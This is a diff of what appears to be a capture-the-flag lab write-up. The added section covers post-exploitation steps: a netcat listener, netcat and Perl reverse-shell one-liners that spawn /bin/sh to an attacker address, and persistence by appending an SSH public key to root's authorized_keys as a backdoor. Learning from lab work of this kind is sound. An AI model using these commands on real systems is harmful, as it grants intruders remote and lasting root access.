@@ -179,22 +179,64 @@ $ sudo less /root/3rd.txt
 fleeb juice
 ```
 
-
-
 ### Additional pointers
 
-**(1) Attempts to initiate a reverse shell**
+**(1) Attempts to initiate a reverse shell (for a stable shell experience)**
+
+**Attacker machine**
 
 ```bash
-$ perl ... # perl
-$ ... # bash
-$ ... # python
-$ nc <attacker> [port] -e /bin/sh # netcat
+$ nc -lvnp [port]
 ```
 
-\
-**(2) Attempt to add a new SSH authorized key**&#x20;
+_**1.1 Netcat (does not work)**_
+
+* The attacker machine does not receive any connections
 
 ```bash
-$ ...
+$ nc <attacker> [port] -e /bin/sh 
 ```
+
+_**1.2 Perl (works)**_
+
+* The attacker machine receives a shell environment
+
+```bash
+$ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+**(2) Persistence**&#x20;
+
+Now that we have a session with superuser privileges (`sudo`), we can load our SSH public key to the `.ssh/authorized_keys` file. Specifically, the key will be added to the file under the home directory for the root user: `/root`, allowing us to gain persistence as the root user.
+
+{% embed url="https://jarrettgxz-sec.gitbook.io/networking-concepts/ssh/ssh-public-key-authentication" %}
+
+_**From the attacker machine**_
+
+_**2.1 Generate a SSH keypair**_&#x20;
+
+```bash
+$ ssh-keygen -f ssh-user-key
+
+# view the PUBLIC key generated
+$ cat ssh-user-key.pub
+ssh-rsa AAAA... user@host
+```
+
+_**2.2 Load the public key (reverse shell connection)**_
+
+```bash
+$ echo "ssh-rsa AAAA... user@host" | sudo tee -a /root/.ssh/authorized_keys > /dev/null
+```
+
+***
+
+Now, we can SSH into the server as the `root` user by providing our private key:
+
+```bash
+$ ssh -i ssh-user-key root@host
+
+root@host:~#
+```
+
+Assuming that the admin does not clean up the `.ssh/authorized_keys` file, we can access our backdoor with a root shell anytime as needed.
